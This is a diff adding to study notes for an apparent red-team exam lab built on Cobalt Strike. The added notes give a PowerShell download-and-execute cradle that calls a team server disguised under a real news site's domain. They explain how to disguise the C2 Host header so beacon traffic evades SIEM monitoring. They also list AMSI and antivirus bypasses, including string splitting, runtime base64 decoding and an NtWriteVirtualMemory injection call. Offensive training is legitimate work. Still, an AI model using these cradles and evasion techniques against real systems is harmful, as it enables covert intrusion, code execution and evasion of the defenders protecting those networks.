@@ -837,10 +837,76 @@ Select: http listener → Launch → copy URL
 
 On target (Workstation — PowerShell):
 ```powershell
-iex (new-object net.webclient).downloadstring("http://<teamserver>/payload_url")
+iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/<uri>")
 ```
 
 New beacon checks in on attacker desktop → confirm `getuid`, check `ps` for Defender processes.
+
+---
+
+### HTTP Listener Host Masquerading — `www.bleepincomputer.com`
+
+> **Exam OPSEC criterion:** "Outbound from unusual processes" — the C2 Host header is part of this.
+
+The `HTTP Hosts` / `HTTP Host (Stager)` value in the CS listener controls what goes in the
+HTTP `Host:` header of Beacon's check-in and staging requests. The TCP connection still goes
+to the team server IP — only the HTTP header changes.
+
+```
+RAW IP (avoid — obvious C2):
+  Beacon HTTP request:  Host: 10.0.0.5
+  SIEM/proxy sees:      Internal host making HTTP requests to a raw IP → flagged
+
+MASQUERADING (use this):
+  Beacon HTTP request:  Host: www.bleepincomputer.com
+  SIEM/proxy sees:      Host browsing legitimate security news site → blends in
+```
+
+In the ZPS lab environment, internal DNS resolves `www.bleepincomputer.com` → team server IP
+(10.0.0.5). You do not configure this — the lab/exam infrastructure handles it.
+
+**Exam day:** Keep the HTTP listener host set to a legitimate-looking domain (lab uses
+`www.bleepincomputer.com`). The URL `http://www.bleepincomputer.com/<uri>` in Scripted Web
+Delivery is what you run on the foothold workstation to call back to your team server.
+
+**If flagged on network:** change the listener host domain to something more context-appropriate
+(a site the target org would legitimately access). In the exam lab this is pre-configured.
+
+---
+
+### Resource Kit — `System.dll` Alternative Bypasses
+
+If ThreatCheck AMSI still detects after `'Sys'+'tem.dll'` substitution, escalate:
+
+```powershell
+# Variable + concat:
+$s = 'System'; .Equals($s + '.dll')
+
+# Char array join:
+.Equals([string]::Join('', @('S','y','s','t','e','m','.','d','l','l')))
+
+# Base64 decode at runtime (strongest):
+.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLmRsbA==')))
+# 'U3lzdGVtLmRsbA==' = base64('System.dll')
+```
+
+### Resource Kit — `WriteProcessMemory` Alternative Bypasses
+
+If the API name string is flagged:
+
+```powershell
+# Split the API name string:
+func_get_proc_address kernel32.dll ('Write'+'ProcessMemory')
+
+# Lower-level ntdll API — less signatured:
+$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
+    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
+)
+$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
+```
+
+**Priority:** Lab value → ThreatCheck → split string → ThreatCheck → NtWriteVirtualMemory if still flagged.
 
 ---
 
